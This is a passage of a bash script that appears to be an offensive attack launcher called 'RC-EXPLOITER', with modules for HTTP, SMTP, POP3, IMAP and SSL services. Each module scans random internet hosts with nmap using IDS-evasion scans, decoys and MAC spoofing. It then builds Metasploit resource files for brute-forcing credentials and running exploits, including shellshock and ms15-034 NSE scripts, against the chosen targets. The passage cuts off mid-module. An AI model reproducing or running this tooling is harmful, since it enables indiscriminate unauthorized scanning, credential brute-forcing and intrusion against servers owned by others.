  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg TARGETURI /cgi-bin/printenv.cgi" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[http].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/http.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1

         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp http.rc http.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" http.rc
         cd $IPATH


        # check if exists nmap scripts folder
        if [ -d $nSeS ]; then
            # copy nse scripts and lua lib to nmap directory
            echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
            sleep 1
            cp $IPATH/bin/file-checker.nse $nSeS/file-checker.nse
            cp $IPATH/bin/http-shellshock.nse $nSeS/http-shellshock.nse
            cp $IPATH/bin/ms15-034.nse $nSeS/ms15-034.nse
            cp $IPATH/bin/phpipam.nse $nSeS/phpipam.nse

        else

          # error nse folder not found
          echo ${RedF}[x]☠ [ERROR][ NSE FOLDER NOT FOUND UNDER ] ${Reset};
          echo ${RedF}[x]☠ [PATH=][ $nSeS ] ${Reset};
          sleep 2
          # manually input NSE folders path and metasploit nmap path
         qU=$(zenity --title "☠ INPUT NSE SCRIPTS INSTALL PATH ☠" --text "example: /usr/share/nmap/scripts" --entry --width 350) > /dev/null 2>&1
          echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
          # copy files to its rigth place in nmapdb and msfdb
          cp $IPATH/bin/file-checker.nse $qU/file-checker.nse
          cp $IPATH/bin/http-shellshock.nse $qU/http-shellshock.nse
          cp $IPATH/bin/ms15-034.nse $qU/ms15-034.nse
          cp $IPATH/bin/phpipam.nse $qU/phpipam.nse
        fi


      # update NSE database befor running resource files
      nmap --script-updatedb > /dev/null 2>&1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ NSE db updated ...     [${GreenF}OK${white}] ${Reset};
      sleep 1

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits  [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[http].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/http.bk $IPATH/exploits/http.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/http.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# SMTP exploiter
# --------------
sh_10 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 25 --open --reason -oN $IPATH/logs/Random-Hosts[smtp].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 25\nLOGFILE: Random-Hosts[smtp].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 25 --open --reason -oN $IPATH/logs/Random-Hosts[smtp].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 25\nLOGFILE: Random-Hosts[smtp].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[smtp].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[smtp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/smtp.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[smtp].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp smtp.rc smtp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" smtp.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[smtp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/smtp.bk $IPATH/exploits/smtp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/smtp.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[smtp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/smtp.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1

         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp smtp.rc smtp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" smtp.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[smtp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/smtp.bk $IPATH/exploits/smtp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/smtp.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# POP3 exploiter
# --------------
sh_11 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 110 --open --reason -oN $IPATH/logs/Random-Hosts[pop3].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 110\nLOGFILE: Random-Hosts[pop3].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 110 --open --reason -oN $IPATH/logs/Random-Hosts[pop3].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 110\nLOGFILE: Random-Hosts[pop3].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[pop3].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[pop3].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/pop3.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[pop3].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp pop3.rc pop3.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" pop3.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[pop3].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/pop3.bk $IPATH/exploits/pop3.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/pop3.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[pop3].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/pop3.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp pop3.rc pop3.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" pop3.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[pop3].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/pop3.bk $IPATH/exploits/pop3.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/pop3.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# IMAP exploiter
# --------------
sh_12 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 143,993 --open --reason -oN $IPATH/logs/Random-Hosts[imap].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 143,993\nLOGFILE: Random-Hosts[imap].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 143,993 --open --reason -oN $IPATH/logs/Random-Hosts[imap].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 143,993\nLOGFILE: Random-Hosts[imap].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[imap].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[imap].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/imap.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[imap].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp imap.rc imap.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" imap.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[imap].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/imap.bk $IPATH/exploits/imap.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/imap.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[imap].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/imap.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp imap.rc imap.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" imap.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[imap].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/imap.bk $IPATH/exploits/imap.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/imap.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# SSL exploiter
# --------------
sh_13 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 443 --open --reason -oN $IPATH/logs/Random-Hosts[ssl].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 443\nLOGFILE: Random-Hosts[ssl].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
